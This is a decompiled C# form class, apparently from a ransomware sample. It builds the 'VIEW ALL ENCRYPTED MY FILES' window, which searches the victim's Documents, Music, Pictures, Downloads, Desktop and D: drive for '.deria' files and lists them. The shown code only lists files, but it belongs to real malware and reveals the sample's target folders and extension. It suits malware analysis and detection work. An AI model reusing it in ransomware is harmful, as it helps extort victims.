// Decompiled with JetBrains decompiler
// Type: LOGON.DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
// Assembly: LOGON, Version=1.1.1.1, Culture=neutral, PublicKeyToken=null
// MVID: A3BF122D-6FEC-449F-A368-029CC8AC51AA
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Gen.gen-d8d3c4d91a5ca4f0bc22289d479764d4ed00cbb5f780c5a96e26d3ba069a6ff8.exe

using LOGON.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace LOGON
{
  [DesignerGenerated]
  public class DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD : 
    Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;

    [DebuggerNonUserCode]
    static DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD()
    {
    }

    [DebuggerNonUserCode]
    public DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD()
    {
      this.Load += new EventHandler(this.Form4_Load);
      DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList)
      {
        if (DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.Count == DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList[index1] = DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.RemoveRange(index1, checked (DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.Count - index1));
          DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.Capacity = DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.Count;
        }
        DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.ListBox1 = new ListBox();
      this.SuspendLayout();
      this.ListBox1.FormattingEnabled = true;
      this.ListBox1.Location = new Point(12, 12);
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1 = this.ListBox1;
      Size size1 = new Size(963, 628);
      Size size2 = size1;
      listBox1.Size = size2;
      this.ListBox1.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(987, 650);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ListBox1);
      this.FormBorderStyle = FormBorderStyle.Fixed3D;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = "Form4";
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "VIEW ALL ENCRYPTED MY FILES";
      this.ResumeLayout(false);
    }

    internal virtual ListBox ListBox1
    {
      [DebuggerNonUserCode] get => this._ListBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox1 = value;
    }

    private void Form4_Load(object sender, EventArgs e)
    {
      try
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments, SearchOption.SearchAllSubDirectories))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory, SearchOption.SearchAllSubDirectories, "*.deria"))
              {
                if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
                  this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments, SearchOption.SearchTopLevelOnly, "*.deria"))
          {
            if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
              this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(MyProject.Computer.FileSystem.SpecialDirectories.MyMusic, SearchOption.SearchAllSubDirectories))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory, SearchOption.SearchAllSubDirectories, "*.deria"))
              {
                if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
                  this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.MyMusic, SearchOption.SearchTopLevelOnly, "*.deria"))
          {
            if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
              this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(MyProject.Computer.FileSystem.SpecialDirectories.MyPictures, SearchOption.SearchAllSubDirectories))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory, SearchOption.SearchAllSubDirectories, "*.deria"))
              {
                if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
                  this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(MyProject.Computer.FileSystem.SpecialDirectories.MyPictures, SearchOption.SearchTopLevelOnly, "*.deria"))
          {
            if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
              this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories("C:\\Users\\" + Environment.UserName + "\\Downloads", SearchOption.SearchAllSubDirectories))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory, SearchOption.SearchAllSubDirectories, "*.deria"))
              {
                if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
                  this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads", SearchOption.SearchTopLevelOnly, "*.deria"))
          {
            if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
              this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories("C:\\Users\\" + Environment.UserName + "\\Desktop", SearchOption.SearchAllSubDirectories))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory, SearchOption.SearchAllSubDirectories, "*.deria"))
              {
                if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
                  this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop", SearchOption.SearchTopLevelOnly, "*.deria"))
          {
            if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
              this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories("D:\\", SearchOption.SearchAllSubDirectories))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory, SearchOption.SearchAllSubDirectories, "*.deria"))
              {
                if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
                  this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles("D:\\", SearchOption.SearchTopLevelOnly, "*.deria"))
          {
            if (!file.EndsWith("desktop.ini") && !this.ListBox1.Items.Contains((object) file))
              this.ListBox1.Items.Add((object) Strings.Replace(file, ".deria", ""));
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories("D:\\", SearchOption.SearchTopLevelOnly))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory))
              {
                if (directory.EndsWith(".deria") && !this.ListBox1.Items.Contains((object) directory))
                  this.ListBox1.Items.Add((object) Strings.Replace(directory, ".deria", ""));
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
